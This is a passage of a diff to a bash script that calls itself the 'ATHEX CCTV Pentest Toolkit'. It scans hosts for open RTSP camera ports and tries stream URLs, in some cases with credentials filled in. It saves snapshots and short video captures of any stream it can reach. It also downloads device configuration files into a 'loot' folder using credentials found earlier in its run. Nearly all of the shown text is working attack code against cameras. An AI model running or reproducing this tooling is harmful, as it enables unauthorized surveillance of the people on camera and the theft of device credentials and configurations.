-                            auth_rtsp_url=\"rtsp://\$cred@\$host:\$rtsp_port\$rtsp_path\"
-                            if timeout 5 ffprobe -loglevel error \"\$auth_rtsp_url\" &> /dev/null; then
-                                echo \"\$auth_rtsp_url\" >> \"$OUTPUT_DIR/streams/accessible_streams.txt\"
-                                capture_rtsp_snapshot_fast \"\$auth_rtsp_url\" \"\$host\"
-                                break
-                            fi
-                        done
-                    fi
-                done < \"$OUTPUT_DIR/rtsp_urls.txt\"
-            fi
-        done
-        " &
-        local rtsp_pid=$!
-        progress_spinner "RTSP Stream Discovery"
-        wait $rtsp_pid
-    else
-        echo -e "${YELLOW}[INFO] Parallel not available, running sequential discovery...${NC}"
-        while IFS= read -r host; do
-            for rtsp_port in $(echo $RTSP_PORTS | tr ',' ' '); do
-                if nc -z -w 1 "$host" "$rtsp_port" &> /dev/null; then
-                    echo "$host:$rtsp_port" >> "$OUTPUT_DIR/recon/rtsp_hosts.txt"
-                    
-                    while IFS= read -r rtsp_path; do
-                        rtsp_url="rtsp://$host:$rtsp_port$rtsp_path"
+                    if command -v ffprobe &> /dev/null; then
                         if timeout 5 ffprobe -loglevel error "$rtsp_url" &> /dev/null; then
                             echo "$rtsp_url" >> "$OUTPUT_DIR/streams/accessible_streams.txt"
                             capture_rtsp_snapshot_fast "$rtsp_url" "$host"
+                            echo -e "${GREEN}[STREAM] Found: $rtsp_url${NC}"
                         fi
-                    done < "$OUTPUT_DIR/rtsp_urls.txt"
-                fi
-            done
-        done < "$OUTPUT_DIR/recon/live_hosts.txt"
-    fi
+                    fi
+                done < "$OUTPUT_DIR/rtsp_urls.txt"
+            fi
+        done
+    done < "$OUTPUT_DIR/recon/live_hosts.txt"
     
     local stream_count=0
     if [ -f "$OUTPUT_DIR/streams/accessible_streams.txt" ]; then
-        stream_count=$(wc -l < "$OUTPUT_DIR/streams/accessible_streams.txt")
+        stream_count=$(wc -l < "$OUTPUT_DIR/streams/accessible_streams.txt" 2>/dev/null || echo 0)
     fi
     
     if [ "$stream_count" -gt 0 ]; then
@@ -1105,7 +951,8 @@ capture_rtsp_snapshot_fast() {
     if command -v ffmpeg &> /dev/null; then
         timeout 10 ffmpeg -loglevel quiet -i "$rtsp_url" -vframes 1 -q:v 2 "$snapshot_file" &> /dev/null &
         local snapshot_pid=$!
-        wait $snapshot_pid
+        sleep 2
+        kill "$snapshot_pid" 2>/dev/null || true
         
         if [ -f "$snapshot_file" ] && [ -s "$snapshot_file" ]; then
             echo -e "${GREEN}[SNAPSHOT] Captured: $snapshot_file${NC}"
@@ -1115,7 +962,7 @@ capture_rtsp_snapshot_fast() {
     fi
 }
 
-# Live Stream Capture with Animations
+# Live Stream Capture
 live_stream_capture() {
     echo -e "${CYAN}[PHASE 5] LIVE STREAM CAPTURE${NC}"
     
@@ -1129,27 +976,17 @@ live_stream_capture() {
     # Show recording animation
     typewriter_effect "🎥 LIVE STREAM RECORDING ACTIVATED" "$BOLD_RED"
     
-    local capture_duration=10  # Reduced from 30 to prevent long waits
+    local capture_duration=10
     
-    # Capture from first 2 streams to avoid overload
-    head -2 "$OUTPUT_DIR/streams/accessible_streams.txt" | while read -r stream_url; do
+    # Capture from first stream only
+    head -1 "$OUTPUT_DIR/streams/accessible_streams.txt" | while read -r stream_url; do
         echo -e "${BLUE}[RECORDING] $stream_url${NC}"
         
-        local filename
-        filename=$(echo "$stream_url" | sed 's/[^a-zA-Z0-9]/_/g')
+        local filename=$(echo "$stream_url" | sed 's/[^a-zA-Z0-9]/_/g')
         local output_file="$OUTPUT_DIR/streams/capture_${filename}_$(date +%s).mp4"
         
         if command -v ffmpeg &> /dev/null; then
-            # Capture video with timeout
-            timeout $((capture_duration + 5)) ffmpeg -loglevel quiet -i "$stream_url" -t $capture_duration -c copy "$output_file" &
-            local capture_pid=$!
-            
-            # Show progress for this stream
-            progress_bar $capture_duration &
-            local progress_pid=$!
-            
-            wait $capture_pid
-            kill $progress_pid 2>/dev/null
+            timeout "$((capture_duration + 5))" ffmpeg -loglevel quiet -i "$stream_url" -t "$capture_duration" -c copy "$output_file" 2>/dev/null
             
             if [ -f "$output_file" ] && [ -s "$output_file" ]; then
                 echo -e "${GREEN}[SUCCESS] Saved: $output_file${NC}"
@@ -1165,7 +1002,7 @@ live_stream_capture() {
     security_shield
 }
 
-# Configuration Extraction with Animations
+# Configuration Extraction
 configuration_extraction() {
     echo -e "${CYAN}[PHASE 6] CONFIGURATION EXTRACTION${NC}"
     
@@ -1179,19 +1016,10 @@ configuration_extraction() {
     
     echo -e "${YELLOW}[CONFIG] Extracting configurations...${NC}"
     
-    while IFS= read -r cred_line; do
-        local host=$(echo "$cred_line" | cut -d: -f1)
-        local port=$(echo "$cred_line" | cut -d: -f2)
-        local user=$(echo "$cred_line" | cut -d: -f3)
-        local pass=$(echo "$cred_line" | cut -d: -f4)
-        
+    while IFS=: read -r host port user pass; do
         echo -e "${BLUE}[EXTRACTING] $host:$port${NC}"
-        
-        extract_configurations "$host" "$port" "$user" "$pass" &
+        extract_configurations "$host" "$port" "$user" "$pass"
     done < "$OUTPUT_DIR/credentials/found_credentials.txt"
-    
-    progress_spinner "Configuration Extraction"
-    wait
     
     echo -e "${GREEN}[SUCCESS] Configuration extraction completed${NC}"
 }
@@ -1203,8 +1031,7 @@ extract_configurations() {
     local user=$3
     local pass=$4
     
-    local auth
-    auth=$(echo -n "$user:$pass" | base64)
+    local auth=$(echo -n "$user:$pass" | base64 2>/dev/null | tr -d '\n')
     
     # Common configuration paths
     local config_urls=(
@@ -1212,17 +1039,14 @@ extract_configurations() {
         "/config/config.json"
         "/cgi-bin/config"
         "/backup/config.bak"
-        "/db/configuration.db"
         "/system.ini"
         "/config.ini"
-        "/setup.ini"
     )
     
     for config_url in "${config_urls[@]}"; do
         if curl -s -H "Authorization: Basic $auth" "http://$host:$port$config_url" -o "/tmp/config_temp" &> /dev/null; then
             if [ -s "/tmp/config_temp" ]; then
-                local safe_name
-                safe_name=$(echo "$config_url" | sed 's|/|_|g')
+                local safe_name=$(echo "$config_url" | sed 's|/|_|g')
                 mv "/tmp/config_temp" "$OUTPUT_DIR/loot/config_${host}_${safe_name}" 2>/dev/null
                 echo -e "${GREEN}[CONFIG] Downloaded: $config_url from $host${NC}"
             fi
@@ -1230,7 +1054,7 @@ extract_configurations() {
     done
 }
 
-# Full Automated Assessment with All Animations
+# Full Automated Assessment
 full_automated_assessment() {
     echo -e "${CYAN}[MODE] FULL AUTOMATED CCTV ASSESSMENT${NC}"
     
@@ -1242,7 +1066,7 @@ full_automated_assessment() {
     
     typewriter_effect "🚀 STARTING COMPREHENSIVE CCTV SECURITY ASSESSMENT" "$BOLD_CYAN"
     
-    # Run all phases automatically with animations
+    # Run all phases
     ultra_fast_discovery
     advanced_vulnerability_scanner
     mass_credential_attack
@@ -1291,7 +1115,7 @@ generate_professional_report() {
     fi
 }
 
-# Create HTML Report
+# Create HTML Report - FIXED: heredoc escaping
 create_html_report() {
     local host_count=0
     local cred_count=0
@@ -1419,18 +1243,6 @@ exit_script() {
     typewriter_effect "Thank you for using ATHEX CCTV Pentest Toolkit!" "$BOLD_GREEN"
     echo -e "${GREEN}[SUCCESS] Stay secure! - ATHEX BL4CK H4T${NC}"
     exit 0
-}
-
-# Get target input
-get_target() {
-    if [ -z "$TARGET" ]; then
-        echo -e "${YELLOW}[TARGET] Enter target IP/CIDR (e.g., 192.168.1.1 or 192.168.1.0/24):${NC}"
-        read -r TARGET
-        if [ -z "$TARGET" ]; then
-            echo -e "${RED}[ERROR] Target is required${NC}"
-            exit 1
-        fi
-    fi
 }
 
 # Main execution
